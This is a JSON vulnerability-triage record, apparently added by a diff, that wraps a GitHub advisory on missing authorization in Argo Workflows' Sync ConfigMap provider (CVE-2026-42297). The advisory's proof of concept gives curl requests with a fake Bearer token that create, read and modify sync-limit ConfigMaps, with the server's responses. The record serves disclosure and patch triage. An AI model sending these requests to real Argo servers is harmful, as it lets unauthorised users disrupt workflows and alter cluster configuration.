@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/40492358?v=4\", \"events_url\": \"https://api.github.com/users/nebojsaj1726/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/nebojsaj1726/followers\", \"following_url\": \"https://api.github.com/users/nebojsaj1726/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/nebojsaj1726/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/nebojsaj1726\", \"id\": 40492358, \"login\": \"nebojsaj1726\", \"node_id\": \"MDQ6VXNlcjQwNDkyMzU4\", \"organizations_url\": \"https://api.github.com/users/nebojsaj1726/orgs\", \"received_events_url\": \"https://api.github.com/users/nebojsaj1726/received_events\", \"repos_url\": \"https://api.github.com/users/nebojsaj1726/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/nebojsaj1726/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/nebojsaj1726/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/nebojsaj1726\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/1827156?v=4\", \"events_url\": \"https://api.github.com/users/Joibel/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Joibel/followers\", \"following_url\": \"https://api.github.com/users/Joibel/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Joibel/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Joibel\", \"id\": 1827156, \"login\": \"Joibel\", \"node_id\": \"MDQ6VXNlcjE4MjcxNTY=\", \"organizations_url\": \"https://api.github.com/users/Joibel/orgs\", \"received_events_url\": \"https://api.github.com/users/Joibel/received_events\", \"repos_url\": \"https://api.github.com/users/Joibel/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Joibel/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Joibel/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Joibel\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_reviewer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/28187128?v=4\", \"events_url\": \"https://api.github.com/users/isubasinghe/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/isubasinghe/followers\", \"following_url\": \"https://api.github.com/users/isubasinghe/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/isubasinghe/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/isubasinghe\", \"id\": 28187128, \"login\": \"isubasinghe\", \"node_id\": \"MDQ6VXNlcjI4MTg3MTI4\", \"organizations_url\": \"https://api.github.com/users/isubasinghe/orgs\", \"received_events_url\": \"https://api.github.com/users/isubasinghe/received_events\", \"repos_url\": \"https://api.github.com/users/isubasinghe/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/isubasinghe/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/isubasinghe/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/isubasinghe\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42297\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 8.5, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:N/SI:H/SA:H\"}}, \"cwes\": [{\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"### Summary\\nThe Sync Service's ConfigMap-backed provider (`server/sync/sync_cm.go`) performs **zero authorization checks** on all CRUD operations (create, read, update, delete). Any authenticated user — including those using fake Bearer tokens — can create, read, update, and delete Kubernetes ConfigMaps containing synchronization limits.\\n\\n### Details\\nThe ConfigMap-backed provider (`server/sync/sync_cm.go`) has no `auth.CanI` checks:\\n\\n```go\\n// sync_cm.go — UNPROTECTED\\nfunc (s *configMapSyncProvider) createSyncLimit(ctx context.Context, req *syncpkg.CreateSyncLimitRequest) {\\n    // NO auth.CanI check\\n    kubeClient := auth.GetKubeClient(ctx)\\n    configmapGetter := kubeClient.CoreV1().ConfigMaps(req.Namespace)\\n    // ... directly creates/updates ConfigMaps\\n}\\n```\\n- `server/sync/sync_cm.go` — lines 23-155\\n- All four SyncService endpoints: `CreateSyncLimit`, `GetSyncLimit`, `UpdateSyncLimit`, `DeleteSyncLimit`\\n\\n### PoC\\n### Prerequisites\\n\\n- Argo Server running with `--auth-mode=server`\\n- Port-forward: `kubectl port-forward -n argo svc/argo-server 2746:2746`\\n\\n### Step 1: Create Sync Limit (Fake Token)\\n\\n```bash\\ncurl -sk -X POST \\\"https://localhost:2746/api/v1/sync/default\\\" \\\\\\n  -H \\\"Authorization: Bearer fake-token\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"type\\\": 0, \\\"namespace\\\": \\\"default\\\", \\\"cmName\\\": \\\"test-sync\\\", \\\"key\\\": \\\"test-key\\\", \\\"limit\\\": 5}'\\n```\\n\\n**Result:** `{\\\"namespace\\\":\\\"default\\\",\\\"cmName\\\":\\\"test-sync\\\",\\\"key\\\":\\\"test-key\\\",\\\"limit\\\":5}`\\n\\nVerify ConfigMap was created in Kubernetes:\\n\\n```bash\\nkubectl get configmap test-sync -n default\\n```\\n\\n```\\nNAME        DATA   AGE\\ntest-sync   1      74s\\n```\\n\\n### Step 2: Read Sync Limit (Fake Token)\\n\\n```bash\\ncurl -sk \\\"https://localhost:2746/api/v1/sync/default/test-key?type=0&cmName=test-sync\\\" \\\\\\n  -H \\\"Authorization: Bearer fake-token\\\"\\n```\\n\\n**Result:** `{\\\"namespace\\\":\\\"default\\\",\\\"cmName\\\":\\\"test-sync\\\",\\\"key\\\":\\\"test-key\\\",\\\"limit\\\":5}`\\n\\n### Step 3: Update Sync Limit (Fake Token)\\n\\n```bash\\ncurl -sk -X PUT \\\"https://localhost:2746/api/v1/sync/default/test-key\\\" \\\\\\n  -H \\\"Authorization: Bearer fake-token\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"type\\\": 0, \\\"namespace\\\": \\\"default\\\", \\\"cmName\\\": \\\"test-sync\\\", \\\"key\\\": \\\"test-key\\\", \\\"limit\\\": 999}'\\n```\\n\\n**Result:** `{\\\"namespace\\\":\\\"default\\\",\\\"cmName\\\":\\\"test-sync\\\",\\\"key\\\":\\\"test-key\\\",\\\"limit\\\":999}`\\n\\nVerify the ConfigMap was actually modified:\\n\\n```bash\\nkubectl get configmap test-sync -n default -o jsonpath='{.data.test-key}'\\n```\\n\\n```\\n999\\n```\\n\\n### Impact\\nAn attacker with network access to the Argo Server can:\\n\\n1. **Denial of Service** — Set sync limits to `0` or `1`, blocking all parallel workflow execution\\n2. **Workflow Disruption** — Modify existing sync limits to break running workflows\\n3. **Information Disclosure** — Read ConfigMap data that may contain sensitive configuration\\n4. **Arbitrary ConfigMap Manipulation** — Create/delete ConfigMaps in any namespace accessible to the server's service account\\n\\n## Related CVEs\\n\\n- **CVE-2026-28229** (GHSA-56px-hm34-xqj5): Unauthorized access to WorkflowTemplate endpoints — same root cause (missing `auth.CanI` check)\\n- **CVE-2024-53862** (GHSA-h36c-m3rf-34h9): Archived workflow auth bypass — same pattern\", \"epss\": {\"percentage\": 0.00515, \"percentile\": 0.39899}, \"ghsa_id\": \"GHSA-xchc-cqwg-g76q\", \"github_reviewed_at\": \"2026-05-04T20:00:18Z\", \"html_url\": \"https://github.com/advisories/GHSA-xchc-cqwg-g76q\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-xchc-cqwg-g76q\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42297\"}], \"nvd_published_at\": \"2026-05-09T04:16:25Z\", \"published_at\": \"2026-05-04T20:00:18Z\", \"references\": [\"https://github.com/argoproj/argo-workflows/security/advisories/GHSA-xchc-cqwg-g76q\", \"https://github.com/argoproj/argo-workflows/commit/09fff05e0830c14a5e36cc40597ad84881db1ab6\", \"https://github.com/argoproj/argo-workflows/releases/tag/v4.0.5\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42297\", \"https://github.com/advisories/GHSA-xchc-cqwg-g76q\"], \"repository_advisory_url\": \"https://api.github.com/repos/argoproj/argo-workflows/security-advisories/GHSA-xchc-cqwg-g76q\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/argoproj/argo-workflows\", \"summary\": \"Argo has Missing Authorization in its Sync ConfigMap Provider\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-13T13:39:05Z\", \"url\": \"https://api.github.com/advisories/GHSA-xchc-cqwg-g76q\", \"vulnerabilities\": [{\"first_patched_version\": \"4.0.5\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/argoproj/argo-workflows/v4\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 4.0.0, < 4.0.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-xchc-cqwg-g76q",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/argoproj/argo-workflows/v4: >= 4.0.0, < 4.0.5"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2024-53862",
+      "CVE-2026-28229",
+      "CVE-2026-42297"
+    ],
+    "cvss_score": 8.5,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:N/SI:H/SA:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/argoproj/argo-workflows/v4"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.790051Z",
+  "provenance": {
+    "content_sha256": "1560a02430e8837b9b0f846fdea1380a11ba95929e3b570cb6161072443cd408",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-04T20:00:18Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-xchc-cqwg-g76q",
+  "status": "active",
+  "title": "Argo has Missing Authorization in its Sync ConfigMap Provider",
+  "updated_at": "2026-05-13T13:39:05Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-xchc-cqwg-g76q"
+}
